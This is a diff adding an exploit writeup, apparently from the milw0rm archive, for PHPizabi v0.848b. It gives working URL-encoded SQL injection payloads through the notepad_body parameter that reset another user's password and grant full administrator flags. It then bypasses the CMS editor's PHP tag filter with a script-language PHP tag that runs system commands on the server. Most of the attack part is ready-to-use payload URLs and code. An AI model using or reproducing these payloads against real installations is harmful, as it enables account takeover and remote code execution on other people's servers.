@@ -1,0 +1,96 @@
+--------------------------------------------------------------------------------
+PHPizabi v0.848b C1 HFP1 proc.inc.php remote privilege escalation (php.ini
+independent)
+by Nine:Situations:Group::bookoo
+--------------------------------------------------------------------------------
+our site: http://retrogod.altervista.org/
+software site: http://www.phpizabi.net/
+--------------------------------------------------------------------------------
+
+vulnerability:
+sql injection in /theme/default/proc.inc.php
+
+<?php
+
+	function bufferProcParse($buffer) {
+		global $CONF;
+		
+		$tpl = new template;
+		$tpl -> LoadThis($buffer);
+		// HANDLE POSTED NOTEPAD DATA ///////////////////////////////////////////////////////
+		if (isset($_GET["notepad_body"])) {
+			myQ("UPDATE `[x]users` SET `notepad_body` = '".urldecode($_GET["notepad_body"])."' WHERE `id`='".me("id")."'");
+			me("flush");
+		}
+...
+
+note urldecode() ...
+
+exploitation, manual:
+
+injection urls:
+
+change username and password of an existing user:
+[sql]', username = 'bookoo', password = md5('pass') WHERE username = 'user'/*
+which becomes:
+http://host/path_to_phpizabi/?notepad_body=%2527,%20username%20=%20%2527bookoo%2527,%20password%20=%20md5(%2527pass%2527)%20WHERE%20username%20=%20%2527user%
+
+2527/*
+
+grant yourself admin rights:
+[sql]', is_moderator = 1, is_administrator = 1, is_superadministrator = 1 WHERE username = 'bookoo'/*
+which becomes:
+
+http://host/path_to_phpizabi/?notepad_body=%2527,%20is_moderator%20=%201,%20is_administrator%20=%201,%20is_superadministrator%20=%201%20WHERE%20username%20=%
+
+20%2527bookoo%2527/*
+
+navigate:
+
+http://host/path_to_phpizabi/?L=admin.index
+
+boom !
+
+now go to:
+
+http://host/path_to_phpizabi/?L=admin.cms.edit&id={cms.file}
+
+use this opening and closing tag style, example:
+
+<script language="php">
+system("ls -la");
+</script>
+
+(it is always availiable, see:http://www.php.net/manual/en/language.basic-syntax.phpmode.php)
+because of that preg_replace() in /modules/admin/cms/edit.php :
+
+...
+	if (isset($_POST["Submit"])) {
+		if ($handle = fopen("modules/cms/{$_GET["id"]}.php", "w")) {
+			
+			$body =
+				"<?php if (!defined(\"CORE_STRAP\")) die(); ?>\n"
+				.preg_replace('#(<\\?.*\\?>)|(<%.*%>)|<\\?php|<\\?|\\?>|<%|%>#si', NULL, stripslashes($_POST["body"][0]))
+				."\n<!-- Edited by ".me("username")." on ".date($CONF["LOCALE_HEADER_DATE_TIME"])." -->";
+			;
+			
+			fwrite($handle, $body);
+			fclose($handle);
+...
+
+which is bypassed.
+
+save changes and navigate:
+
+http://host/path_to_phpizabi/?L=cms._cms_file_
+
+to see the output...
+
+now visit log page:
+
+http://192.168.0.1/phpizabi/?L=admin.logs.logs
+
+...
+--------------------------------------------------------------------------------
+
+# milw0rm.com [2009-03-24]
